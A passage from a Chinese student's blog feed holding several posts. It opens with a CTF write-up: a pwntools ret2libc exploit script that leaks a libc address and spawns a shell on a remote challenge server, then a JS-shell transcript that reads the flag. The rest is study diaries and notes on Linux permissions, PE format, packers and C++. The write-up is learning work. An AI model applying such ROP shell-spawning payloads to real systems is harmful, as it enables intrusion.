class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#p = process("./8")</span></span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">32410</span>)</span><br><span class="line">elf = ELF(<span class="string">"./8"</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc6_2.23-0ubuntu10_amd64</span></span><br><span class="line">sys_off = <span class="number">0x045390</span></span><br><span class="line">write_off = <span class="number">0x0f72b0</span></span><br><span class="line">binsh_off = <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">pop = <span class="number">0x40089c</span></span><br><span class="line">pop_rdi = <span class="number">0x04008a3</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(<span class="number">0x4007CD</span>)</span><br><span class="line"><span class="comment">#0x18+pop(8个字节)用于复制（下一个函数）后填充第二个栈到返回地址，然后将write的got表pop到rdi，用puts输出，返回到main函数的开头，设置环境</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write_addr = p.recvuntil("\\")</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"\x40"</span>)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\00'</span>))</span><br><span class="line">write_addr = int(write_addr)</span><br><span class="line"><span class="keyword">print</span> write_addr</span><br><span class="line">base = write_addr - write_off</span><br><span class="line">sys = base + sys_off</span><br><span class="line">binsh = binsh_off + base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span>*<span class="number">0x18</span> + p64(pop) + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>好像服务器上和本地程序用的libc又不一样…所以连接完远程服务器后再获得一次write的got表，然后找到libc版本</p><p>主要学到了这个方法：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\00'</span>))</span><br></pre></td></tr></table></figure><br>将接收到的数字左对齐，并用’\00’填充为8位，</p><p>参考：<a href="https://muzibing.github.io/2020/06/12/2020.06.12%EF%BC%88125%EF%BC%89" target="_blank" rel="noopener">https://muzibing.github.io/2020/06/12/2020.06.12%EF%BC%88125%EF%BC%89</a></p><h2 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h2><p>考察js shell<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~<span class="regexp">/Desktop$ nc 220.249.52.133 56451</span></span><br><span class="line"><span class="regexp">js&gt; os.system("pwd")</span></span><br><span class="line"><span class="regexp">os.system("pwd")</span></span><br><span class="line"><span class="regexp">/</span>home/ctf</span><br><span class="line">js&gt; os.system(<span class="string">"ls"</span>)</span><br><span class="line">os.system(<span class="string">"ls"</span>)</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">js</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libnspr4.so</span><br><span class="line">libplc4.so</span><br><span class="line">libplds4.so</span><br><span class="line">run.sh</span><br><span class="line">js&gt; os.system(<span class="string">"cat flag"</span>)</span><br><span class="line">os.system(<span class="string">"cat flag"</span>)</span><br><span class="line">cyberpeace&#123;xxxxxxx&#125;</span><br></pre></td></tr></table></figure></p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2020moectf部分pwn&quot;&gt;&lt;a href=&quot;#2020moectf部分pwn&quot; class=&quot;headerlink&quot; title=&quot;2020moectf部分pwn&quot;&gt;&lt;/a&gt;2020moectf部分pwn&lt;/h1&gt;&lt;h2 id=&quot;rop1&quot;&gt;&lt;a href
      
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://brubbish.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>09-23</title>
    <link href="https://brubbish.github.io/58505.html"/>
    <id>https://brubbish.github.io/58505.html</id>
    <published>2020-11-26T11:46:04.693Z</published>
    <updated>2020-11-28T01:55:20.837Z</updated>
    
    <content type="html"><![CDATA[<p>文件属性：<br>[文件类型][所有者权限|同用户组权限|非本用户组权限][所有者][用户组][容量(b)][修改日期][文件名]<br>文件类型：‘d’-目录、’-‘-文件、‘i’-连接文件、‘b’-可供存储的接口设备、‘c’-串行端口设备<br>权限：r可读w可写x可执行</p><p>改变权限：<br>chgrp：所属用户组<br>chown：所有者</p><p>[命令] (-R) [用户组/所有者] [文件]<br>R:子目录下的所有文件也会更改</p><p>chmod：文件权限<br>r:4,w:2,x:1<br>chomd [各组的权限] [文件]<br>例如：chomd 664 testfile<br>或<br>user(u)、group(g)、others(o)、all(a)<br>chomd u=rwx,g-r,o+w testfile</p><p>复制：<br>cp 源文件 目标文件</p><p>新建目录：mkdir 目录名<br>删除空目录：rmdir 目录名<br>新建文件：touch 文件名<br>显示当前目录：pwd</p><p>目录:<br>/:root,根目录<br>/usr:UNIX software resource 与软件的安装、执行有关<br>/var:与系统运作过程有关</p><p>根目录下的子目录：<br><strong>/bin:放置在但用户维护模式下还能操作的命令</strong><br>/boot:开机会使用到的文件<br><strong>/dev:设备和设备接口，访问这个目录下的某个文件就等于访问某个文件</strong><br><strong>/etc:系统主要配置文件</strong><br>/home:默认用户的主文件夹<br><strong>/lib:开机时会用到的函数库，以及bin和sbin下的命令用到的函数库</strong><br>/media:可删除的设备<br>/mnt:暂时挂载的设备<br>/opt:第三方软件<br>/root:root的主文件夹<br><strong>/sbin:包括开机、修复、还原系统的命令</strong><br>/srv:网络服务所需要取用的数据目录<br>/tmp:让一般用户和正在执行的程序暂时存放文件</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文件属性：&lt;br&gt;[文件类型][所有者权限|同用户组权限|非本用户组权限][所有者][用户组][容量(b)][修改日期][文件名]&lt;br&gt;文件类型：‘d’-目录、’-‘-文件、‘i’-连接文件、‘b’-可供存储的接口设备、‘c’-串行端口设备&lt;br&gt;权限：r可读w可写x可执
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>大一暑假日常</title>
    <link href="https://brubbish.github.io/31605.html"/>
    <id>https://brubbish.github.io/31605.html</id>
    <published>2020-09-01T07:00:30.000Z</published>
    <updated>2020-08-10T05:33:48.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="8-8"><a href="#8-8" class="headerlink" title="8-8"></a>8-8</h2><p>上周在做moectf，被新生赛弄自闭了（</p><p>加密与解密</p><h2 id="8-1"><a href="#8-1" class="headerlink" title="8-1"></a>8-1</h2><p>7-31没学所以没写…<br>写了七题moectf，两题re，三题web，一题pwn，一题经典密码<br>pwn写的感觉自己很瓜，有个叫backdoor的函数名硬是看了半个小时没看到…</p><h2 id="7-29、7-30"><a href="#7-29、7-30" class="headerlink" title="7-29、7-30"></a>7-29、7-30</h2><p>7-29：早上看了点数据结构-树，下午坐动车，在车上看了《程》第六章前三节（然后就睡着了…，晚上啥也没干，日报也没写:)<br>7-30：写了一题pwn，两题re</p><p><a href="/2827.html">材料</a></p><h2 id="7-28"><a href="#7-28" class="headerlink" title="7-28"></a>7-28</h2><p>昨天晚上以为把昨天的上传掉了，结果早上彦林哥问起来的时候发现并没有弄上…下午发现因为昨天那篇用了大括号，hexo g的时候报错了（然后没有注意到就hexo d了）<br>大括号嵌套使用的时候要加上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;内容&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><br>好像其他括号啥的直接嵌套着用也会报错，不过还没有遇到</p><ol><li>数据结构看了串和树的开头</li><li>写了一题pwnable.kr上的题</li></ol><p>本来想写个攻防世界上的”guess_num“，结果场景加载不出来</p><p><a href="/53130.html">材料</a></p><h2 id="7-27"><a href="#7-27" class="headerlink" title="7-27"></a>7-27</h2><p>看了点数据结构，本来想写一题pwn题，结果pwntools突然用不了（可能是之前删了一些文件），安装pwndbg也不知道有没有弄上…就没写了<br>早上kali网络连不上，虚拟机上弄了半个小时没好，物理机的网络重新连接一下又好了…<br>打算这几天写掉这两题   </p><ol><li><a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5057&amp;page=1" target="_blank" rel="noopener">guess_num</a>     </li><li>passcode:ssh passcode@pwnable.kr -p2222 (pw:guest)</li></ol><p><a href="/52170.html">材料(笔记)</a></p><h2 id="7-24"><a href="#7-24" class="headerlink" title="7-24"></a>7-24</h2><ol><li>一题pwn。有思路，但是有个地方不知道怎么实现，看了别人的exp知道怎么写了，不过有些地方还不是很懂</li><li>《逆向工程核心原理》第四章</li></ol><p><a href="/51850.html">材料</a></p><h2 id="7-23"><a href="#7-23" class="headerlink" title="7-23"></a>7-23</h2><ol><li>写了一题攻防世界的pwn题:<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5051&amp;page=1" target="_blank" rel="noopener">when_did_you_born</a>，看了一题<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5057&amp;page=1" target="_blank" rel="noopener">guess_num</a>，还没写出来（应该是不会了…）    </li><li>看了点数据结构的堆栈  部分 </li></ol><p>写题花了比较久，差不多是看了三题发现一题会写，一题思路错了，一题根本没思路….<br><a href="/64573.html">材料</a></p><h2 id="7-22"><a href="#7-22" class="headerlink" title="7-22"></a>7-22</h2><p>今天有半天在动车上…</p><ol><li>攻防世界上写了一题pwn：<a href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5053&amp;page=1" target="_blank" rel="noopener">level0</a></li><li>《程》第四章第一节到第四节</li></ol><p>打算以后十一点半后不看手机电脑了:(<br>好像也没啥材料写…</p><h2 id="7-21"><a href="#7-21" class="headerlink" title="7-21"></a>7-21</h2><p>昨天（周一）把《程》第三章看完，感觉没啥好写的（其实是晚上十一点才想起来就懒得写了…）   </p><ol><li>发现上回把pwntools装上了（之前以为没装成），就在pwnable.kr上写了两题，攻防世界写了一题pwn。emmm看的题比写的多一点</li><li>看了《逆向工程核心原理》的第二章。分析了“hello world”程序，讲了两种修改输出字符串的方法。没啥想法。</li></ol><p>感觉最近越来越懒了…一直看电脑导致眼睛也有点不舒服…<br>不想看PDF，想买书了orz<br><a href="/14532.html">今天的材料</a></p><h2 id="7-17"><a href="#7-17" class="headerlink" title="7-17"></a>7-17</h2><ol><li>把数据结构数组的部分跳过了，看了一些堆栈的   </li><li>写了个<a href="https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5081&amp;page=1" target="_blank" rel="noopener">攻防世界上的re题</a> (以及九道非常入门的web题…)   </li></ol><p><a href="/12344.html">今天的材料</a>   </p><h2 id="7-16"><a href="#7-16" class="headerlink" title="7-16"></a>7-16</h2><ol><li>看了点数组（对称矩阵的压缩存储）。感觉各种存储结构好复杂…明天再查点资料  </li><li>把昨天那题剩下的部分看完了 </li></ol><p><a href="/13445.html">今天的材料</a></p><h2 id="7-15"><a href="#7-15" class="headerlink" title="7-15"></a>7-15</h2><ol><li>《程》第三章第三节</li><li>数据结构线性表的两个应用举例。一个是链式存储一元多项式的和，这个之前在mooc上看过，没啥感觉；另一个打印文本文件最后n行，链表的部分懂了，argc、*argv[]和通过命令行输入参数不是很懂….</li><li>把彦林学长上回给的一题逆向题再看了一点，就汇编代码对照着伪代码理解了一下</li></ol><p><a href="/64075.html">这个是有关材料</a></p><h2 id="7-14"><a href="#7-14" class="headerlink" title="7-14"></a>7-14</h2><p>今天跟昨天差不多，早上有点事，下午去驾校，（晚上打lol），学的很少…   </p><ol><li>《程》第三章，（本来以为能把这章看完，但事实上并没有….）就看了前两节。跟《加密与解密》十一章（PE）有点关系，就多了个ELF文件，感觉这个讲的更细一些，也对之前看的加密与解密更理解了（大概吧）</li><li>双向循环链表和非循环链表。把指针设为llink和rlink，其它好像不是特别难（….）。这章还剩下应用举例没看，感觉好像有点复杂Orz</li></ol><h2 id="7-13"><a href="#7-13" class="headerlink" title="7-13"></a>7-13</h2><p>（今天好像没干啥，早上有点事，下午去驾校挂科二时长的时候才开始看点书）    </p><ol><li>看了点线性链表，感觉基本跟上学期学的没啥差别，就再多了逆转、合并、排序，感觉挺巧妙的但不难</li><li>《程序员的自我修养》看完了第二章，上周第一章“回顾大家所了解的”看得瑟瑟发抖。这章了解了一些预处理、编译、汇编和链接的大致过程，还有静态语言、动态语言、静态链接、动态链接的区别。emmm写编译器真是太难了….</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;8-8&quot;&gt;&lt;a href=&quot;#8-8&quot; class=&quot;headerlink&quot; title=&quot;8-8&quot;&gt;&lt;/a&gt;8-8&lt;/h2&gt;&lt;p&gt;上周在做moectf，被新生赛弄自闭了（&lt;/p&gt;
&lt;p&gt;加密与解密&lt;/p&gt;
&lt;h2 id=&quot;8-1&quot;&gt;&lt;a href=&quot;#8-1&quot; 
      
    
    </summary>
    
    
    
      <category term="日报" scheme="https://brubbish.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>2020.05.25-2020.05.24</title>
    <link href="https://brubbish.github.io/33336.html"/>
    <id>https://brubbish.github.io/33336.html</id>
    <published>2020-05-25T07:00:30.000Z</published>
    <updated>2020-07-08T13:53:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h1><p>可执行文件的格式是操作系统本身执行机制的反映。<br>PE（Portable Executable File Format 可移植的执行体)<br>头文件winnt.h中的image format给出了pe文件的内容，可以找到所有pe文件的数据结构定义、枚举类型、常量定义等<br>exe和dll文件使用完全相同的pe格式，唯一的区别就是用一个字段标识出这个文件是exe还是dll<br>64位Windows只是对pe格式进行了一些简单的修饰，新的格式为pe32+，没有新的结构加入，只是把32位字段扩展成64位<br><img src="https://s1.ax1x.com/2020/05/25/tCceGn.png" alt="tCceGn.png"><br><a id="more"></a></p><h2 id="PE的基本概念"><a href="#PE的基本概念" class="headerlink" title="PE的基本概念"></a>PE的基本概念</h2><p>pe文件的内容分为不同区块，区块中包含代码或数据，各个区块按页边界对齐。区块大小没有限制，是一个连续的结构。每个块在内存中都有自己的属性如是否包含代码、是否可读写等<br>pe文件不是作为单一内存映射文件被载入内存。pe装载器遍历pe文件并决定文件的哪部分被映射。磁盘文件一旦被载入内存，磁盘上的数据结构布局和内存中的数据结构布局就是一致的，但数据之间的的相对位置可能会改变</p><h3 id="基地址"><a href="#基地址" class="headerlink" title="基地址"></a>基地址</h3><p>PE文件通过加载器载入内存后，内存中的版本称为模块。映射文件的起始地址（基地址）称为模块句柄，可以通过模块句柄访问内存中的其他数据结构。<br><img src="https://s1.ax1x.com/2020/05/25/tCcm2q.png" alt="tCcm2q.png"><br>内存中的模块代表进程将这个可执行文件所需要的代码、数据、输入表、输出表及其他有用的数据结构所使用的内存都放在一个连续的内存块中。PE文件的剩余部分可以被读入，但可能无法被映射。例如在将调试信息放到文件尾部时，PE的一个字段会告诉系统不能映射的数据将被放置在文件的尾部。在32位Windows种可以直接调用GetModuleHandle取得指向dll的指针，通过该指针访问DLL Mdodle。<br>基地址的值是由pe文件本身设定的</p><h2 id="虚拟地址（Virtual-Address）"><a href="#虚拟地址（Virtual-Address）" class="headerlink" title="虚拟地址（Virtual Address）"></a>虚拟地址（Virtual Address）</h2><h3 id="相对虚拟地址（RVA）"><a href="#相对虚拟地址（RVA）" class="headerlink" title="相对虚拟地址（RVA）"></a>相对虚拟地址（RVA）</h3><p>相对于pe文件载入地址的偏移位置，其实就是一个偏移量。<br>假设一个文件从400000h处载入，代码区块开始于401000h处，代码区块的RVA计算方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标地址401000-载入地址400000h&#x3D;RVA1000h</span><br></pre></td></tr></table></figure><br>同样，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">虚拟地址VA&#x3D;基地址ImageBase+相对虚拟地址RVA</span><br></pre></td></tr></table></figure></p><h3 id="文件偏移地址（物理地址）"><a href="#文件偏移地址（物理地址）" class="headerlink" title="文件偏移地址（物理地址）"></a>文件偏移地址（物理地址）</h3><p>pe文件的某个数据位置相对于文件头的偏移量<br>用十六进制工具打开文件时显示的地址就是文件偏移地址</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PE文件格式&quot;&gt;&lt;a href=&quot;#PE文件格式&quot; class=&quot;headerlink&quot; title=&quot;PE文件格式&quot;&gt;&lt;/a&gt;PE文件格式&lt;/h1&gt;&lt;p&gt;可执行文件的格式是操作系统本身执行机制的反映。&lt;br&gt;PE（Portable Executable File Format 可移植的执行体)&lt;br&gt;头文件winnt.h中的image format给出了pe文件的内容，可以找到所有pe文件的数据结构定义、枚举类型、常量定义等&lt;br&gt;exe和dll文件使用完全相同的pe格式，唯一的区别就是用一个字段标识出这个文件是exe还是dll&lt;br&gt;64位Windows只是对pe格式进行了一些简单的修饰，新的格式为pe32+，没有新的结构加入，只是把32位字段扩展成64位&lt;br&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/05/25/tCceGn.png&quot; alt=&quot;tCceGn.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
      <category term="c++" scheme="https://brubbish.github.io/tags/c/"/>
    
      <category term="CTF" scheme="https://brubbish.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2020.07.06-2020.07.12</title>
    <link href="https://brubbish.github.io/36664.html"/>
    <id>https://brubbish.github.io/36664.html</id>
    <published>2020-05-25T07:00:30.000Z</published>
    <updated>2020-07-15T13:46:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MS-DOS头部"><a href="#MS-DOS头部" class="headerlink" title="MS-DOS头部"></a>MS-DOS头部</h2><p>每一个pe文件都以一个dos程序开始。程序在dos下执行，dos就能识别出这是一个有效的执行体，然后运行MZ header的DOS stub（dos块）。DOS stub是一个有效的exe，大多数情况下由编译器或汇编器自动生成。通常把DOS MZ头和DOS stub合称为DOS文件头。<br>PE文件的第一个字节位于MS-DOS头部，称作IMAGE_DOS_HEADER，其中有两个字段：e_magic和e_lfanew。   </p><ul><li><p>e_magic的值被设为5A4Dh,ASCII值为MZ  </p></li><li><p>e_lfanew指出真正的PE文件头的相对偏移位置，占4字节，在文件开始偏移3Ch字节处。</p></li></ul><h2 id="PE文件头部"><a href="#PE文件头部" class="headerlink" title="PE文件头部"></a>PE文件头部</h2><p>紧接着DOS stub的是PE文件头。PE文件头是PE相关结构NT映像头的简称，其中包含许多PE装载器能用到的重要字段。当执行体在支持PE文件结构的操作系统中执行是，PE装载器将从IMAGE_DOS_HADER结构的e_lfanew字段中找到PE文件头的起始偏移量，加上基址就得到PE文件头的指针。<br>IMAGE_DOS_HEADER有两个版本，一个是为32位（PE32）可执行文件准备的,另一个是64位（PE32+）的，两个几乎没有区别。<br>IMAGE_DOS_HEADER中有3个字段：</p><h3 id="Signature字段"><a href="#Signature字段" class="headerlink" title="Signature字段"></a>Signature字段</h3><p>在一个有效的PE文件里，Signature字段被设置为0x00004550，对应ASCII字符为PE00<br>MS-DOS头部的e_lfanew正是指向这个字段</p><h3 id="FileHeader字段"><a href="#FileHeader字段" class="headerlink" title="FileHeader字段"></a>FileHeader字段</h3><p>IMAGE_FILE_HEADER（映像头文件）结构包含PE文件的一些基本信息和这个结构的大小。<br>结构的各个字段包括：  </p><ol><li>Machine：可执行文件的目标cpu类型</li><li>NumberOfSection：区块的数目</li><li>TimeDateStamp：文件创建时间</li><li>PointerToSymbolTable：COFF符号表的文件偏移位置</li><li>NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，可以用来找到COFF符号表的结束处</li><li><p>SizeOfOptionalHeader：表示数据的大小，依赖于文件是32位还是64位</p></li><li><p>Characteristics：文件属性，定义域winnt.h内的IMAGE_FILE_xxx值</p></li></ol><h3 id="OptionalHeader字段"><a href="#OptionalHeader字段" class="headerlink" title="OptionalHeader字段"></a>OptionalHeader字段</h3><p>定义PE文件的其他属性</p><h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p><img src="https://s1.ax1x.com/2020/07/10/UMsx29.png" alt="UMsx29.png"><br><img src="https://s1.ax1x.com/2020/07/10/UMszvR.png" alt="UMszvR.png"></p><h3 id="区块表"><a href="#区块表" class="headerlink" title="区块表"></a>区块表</h3><p>区块表是一个IMAGE_SECTION_HEADER结构数组，每个区块表结构包含了它所关联的区块的信息，例如位置、长度等，数组的数目由IMAGE_NT_HEADERS.FileHeader.NumberOfSection指出。   </p><h3 id="常见区块与区块合并"><a href="#常见区块与区块合并" class="headerlink" title="常见区块与区块合并"></a>常见区块与区块合并</h3><p>链接器能够合并区块，优点是节省空间。每个区块至少占用一个内存页，将两个区块合并就有可能少用一个内存页。<br>部分在载入内存时由Windows加载器写入的输入数据可能会被放入只读区块，因为在加载时，系统会临时修改那些包含输入数据的页属性为可读可写，初始化完成后恢复为原来的属性</p><h3 id="区块对齐值"><a href="#区块对齐值" class="headerlink" title="区块对齐值"></a>区块对齐值</h3><p>区块有两种对齐值，一种用于磁盘文件内，一种用于内存，两者可以不同。<br>PE文件头里的FileAlignment定义了<em>磁盘区块</em>的对齐值。在不足的地方（区块间隙）用00h填充<br>PE文件头里的SectionAlignment定义了<em>内存区块</em>的对齐值。当PE文件被映射到内存中时，区块总是至少从一个页边界处开始，即每个区块的第一个字节对应于某个内存页。<br>建立一个区块在文件中的偏移和内存中的偏移相同的PE文件，可以提高载入速度并使文件变大</p><h3 id="文件偏移与虚拟地址的转换"><a href="#文件偏移与虚拟地址的转换" class="headerlink" title="文件偏移与虚拟地址的转换"></a>文件偏移与虚拟地址的转换</h3><p>对于磁盘对齐值和内存页不同的区块，同一数据在磁盘文件中的偏移和在内存中的偏移不同，需要进行转换。<br><img src="https://s1.ax1x.com/2020/07/15/U010qs.png" alt="U010qs.png"><br>文件被映射到内存中时，MS-DOS头部、PE文件头和块表的偏移位置和大小没有变化，而各区块被映射到内存后偏移位置发生变化</p><h2 id="输入表"><a href="#输入表" class="headerlink" title="输入表"></a>输入表</h2><p>可执行文件使用来自其他DLL的代码或数据的动作称为输入。当PE文件被载入时，加载器的工作之一就是定位所有被输入的函数和数据，并让文件可以使用那些地址。这个过程通过PE文件的输入表Import Table完成。输入表中保存的是函数名和其驻留的DLL名等动态链接所需的信息。   </p><h3 id="输入函数的调用"><a href="#输入函数的调用" class="headerlink" title="输入函数的调用"></a>输入函数的调用</h3><p>输入函数被程序调用，但执行代码不在程序中。这些函数的代码位于相关的DLL文件中，在程序中只保留函数信息如函数名、DLL文件名等。磁盘上的PE文件无法得知这些输入函数在内存中的地址，只有当载入内存后，加载器才将相关DLL载入，并将函数地址和调用的指令联系起来   </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MS-DOS头部&quot;&gt;&lt;a href=&quot;#MS-DOS头部&quot; class=&quot;headerlink&quot; title=&quot;MS-DOS头部&quot;&gt;&lt;/a&gt;MS-DOS头部&lt;/h2&gt;&lt;p&gt;每一个pe文件都以一个dos程序开始。程序在dos下执行，dos就能识别出这是一个有效的执行
      
    
    </summary>
    
    
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>2020.05.18-2020.05.25</title>
    <link href="https://brubbish.github.io/33337.html"/>
    <id>https://brubbish.github.io/33337.html</id>
    <published>2020-05-25T07:00:30.000Z</published>
    <updated>2020-07-05T13:39:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>从上周开始不用写周报了<br>感觉没有监督就懒散了23333   </p><h1 id="壳"><a href="#壳" class="headerlink" title="壳"></a>壳</h1><p>附加在原始程序上，通过windows加载器载入内存后，先于原始程序执行，在执行过程中对原始程序进行解密、还原，还原后把控制权还给原始程序，执行原来的代码。可以防止程序文件被非法修改或者静态反编译<br>许多木马和病毒都喜欢用壳来保护和隐藏自己。对一些流行的壳，杀毒引擎先对目标软件进行脱壳，再进行病毒检查；对大多数私人壳，杀毒软件不会开发解压引擎，而是直接当成木马或病毒处理，因此，商业软件出于兼容性的考虑，很少使用加壳保护，而在其他方面提高软件保护强度<br>不同的外壳侧重方面不一样，有的侧重压缩，有的侧重加密，还有一些提供额外的功能，如注册机制、使用次数、时间限制等<br><a id="more"></a></p><h2 id="压缩引擎"><a href="#压缩引擎" class="headerlink" title="压缩引擎"></a>压缩引擎</h2><p>一些加壳软件调用现成的压缩引擎对文件进行压缩，在选择压缩引擎时要保证解压速度快，这样加了壳的文件运行速度才不会受到太大影响</p><h3 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h3><ol><li>upx</li><li>ASPack<h3 id="加密壳"><a href="#加密壳" class="headerlink" title="加密壳"></a>加密壳</h3></li><li>ASProtect</li><li>Armadillo</li><li>EXECryptor</li><li>Themida<h1 id="虚拟机保护"><a href="#虚拟机保护" class="headerlink" title="虚拟机保护"></a>虚拟机保护</h1>许多解释性的语言，如java的jvm。这里讨论的虚拟机（与vmware不同）将一系列指令解释成字节码后放在一个解释引擎中执行，从而对软件进行保护。  <h2 id="虚拟机引擎"><a href="#虚拟机引擎" class="headerlink" title="虚拟机引擎"></a>虚拟机引擎</h2>一个虚拟机引擎由编译器、解释器和虚拟cpu组成，还会搭配一个或多个指令系统。虚拟机在运行时，现根据自定义的指令系统把已知的指令解释成字节码并放在pe文件中，然后将原始代码删除，改成直接进入虚拟机执行。<br>挑事者跟踪并进入虚拟机后很难理解原始指令。想要理解程序就必须对虚拟机引擎进行分析<br>虚拟机技术以效率换取安全，一条指令经过虚拟机处理，体积会膨胀几十几百倍。因此，VM保护通常经过sdk方式，只把较为重要的代码保护起来</li></ol><h1 id="c"><a href="#c" class="headerlink" title="c++"></a>c++</h1><h2 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h2><p>可以用scanf和printf，也可用c++中增加的输入输出库<br>如果要使用输入输出时，需要包含头文件：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br></pre></td></tr></table></figure><br>使用cin和count进行输入和输出<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;x;<span class="comment">//多输出：cin&gt;&gt;x&gt;&gt;y;</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"The int number is x= 